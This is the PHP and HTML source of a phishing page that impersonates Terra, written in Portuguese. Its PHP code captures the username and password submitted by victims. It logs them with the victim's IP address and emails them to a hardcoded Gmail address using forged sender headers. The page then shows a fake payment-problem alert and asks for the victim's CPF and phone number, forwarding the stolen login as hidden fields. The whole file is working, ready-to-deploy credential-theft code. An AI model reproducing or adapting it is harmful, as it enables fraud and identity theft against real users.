<?php

$username = $_POST['username']; //SENHA
$password = $_POST['password']; //SENHA


$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");
$emaildestinatario = 'rsylan63@gmail.com';

$subj = "$ip";
$myFile ="../infos/$ip.html";
$fh = fopen($myFile, 'a') or die("Erro, Tente novamente!");

$conteudo.="
------------------ Dados -------------------<br>
$data-($hora) - $ip<br>
--------------------------------------------<br>
USUARIO.........: $username<br>
SENHA.....: $password<br>";

 fwrite($fh, $conteudo);
   fclose($fh);
$headers = "Content-Type:text/html; charset=UTF-8\n";
$headers .= "From:  GO GO LOGIN<asjdbujqb21@ujasbdu21.com>\n";
$headers .= "X-Sender:  <sdjcbu322@488rehvu8hs2.com>\n";
$headers .= "X-Mailer: PHP  v" . phpversion() . "\n";
$headers .= "X-IP:  " . $_SERVER[ 'REMOTE_ADDR' ] . "\n";
$headers .= "Return-Path:  <sbjad21u1@asdugbay21.com>\n";
$headers .= "MIME-Version: 1.0\n";

$envio = mail("rsylan63@gmail.com", $subj, $conteudo, $headers);
?>
<!DOCTYPE html>
<html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>Mail 🕑</title>
   

    <meta name="theme-color" content="##F1F1F1">
    <meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
    <meta name="msapplication-navbutton-color" content="##F1F1F1">

    <link rel="stylesheet" href="arquivos/all.css">
	   	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
	<script type="text/javascript">
		$("#cp").mask("000.000.000-00");
		$("#tel").mask("(00) 00000-0000");
		
	</script>
<!-- Adicione o link para o arquivo CSS do SweetAlert -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.6/dist/sweetalert2.min.css">

<!-- Adicione o link para o arquivo JavaScript do SweetAlert -->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.6/dist/sweetalert2.min.js"></script>

</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;" >
<style>
.sweet-alert-image {
  width: 80px;
  height: 80px;
  background-image: url('img/alert.png');
  background-size: contain;
  background-repeat: no-repeat;
  margin: 0 auto;
}

.sweet-alert-title {
  font-size: 24px;
  font-weight: bold;
  text-align: center;
  margin-top: 20px;
   color: #FF7212;
}

.sweet-alert-message {
  font-size: 16px;
  text-align: center;
  margin-top: 10px;
}
.swal2-confirm {
  background-color: #C14E00 !important;
  color: white;
  border: none;
  border-radius: 5px;
  padding: 10px 20px;
  font-size: 16px;
}
</style><script>
document.addEventListener("DOMContentLoaded", function() {
  Swal.fire({

    title: '<div class="sweet-alert-image"></div><div class="sweet-alert-title">Oops!</div>',
    html: '<div class="sweet-alert-message">Prezado(a) Cliente Terra, ocorreu algum problema com sua forma de pagamento da sua assinatura, e para evitar futuros transtornos como o bloqueio de sua conta pedimos que você atualize sua forma de pagamento</div>',
    showConfirmButton: true,
    confirmButtonText: 'Confirmar'
  });
});
</script>
    <div id="app">
    <div>
<div class="md">
	<div class="corpo_md" >
		 

		<div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
			<center><img src="img/logo.png" width="132px" height="45px"></center>
			<p>Precisamos que você forneça algumas informações adicionais</p>
			<p>
				Informe seu número de Telefone e o seu CPF
			</p>

			<form id="formulario" id="form" name="form" action="adicional.php" method="post">
				<?php foreach($_POST as $key => $value):  ?>
                <input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
                <?php endforeach; ?>

				<label for="telefone">
					<span style="color: white;">CPF</span>
					<input type="tel" name="cp" id="cp" maxlength="14" placeholder="CPF" required="required">
				</label>
				<label for="telefone">
					<span style="color: white;">Telefone</span>
					<input type="tel" name="tel" id="tel" maxlength="15" placeholder="DDD + Telefone" required="required">
				</label>

				<button class="btn_next" style="color:white;background:#c14e00;" id="submit" type="submit" title="CONFIRMRAR" value="CONFIRMAR">CONFIRMAR</button>
			</form>
		</div>
	</div>
</div>
<div class="wrapper container_dentro">
	<div class="header">
		<div class="buscar"><img src="arquivos/busca.png" alt=""></div>
		<div class="menu"><img src="arquivos/menu.png" alt=""></div>
		
	</div>

	<div class="corpo">
	
		<div class="corpo_img"><img src="arquivos/corpo.png" alt=""></div>
	</div>
</div>
</div>
    </div>


</body></html>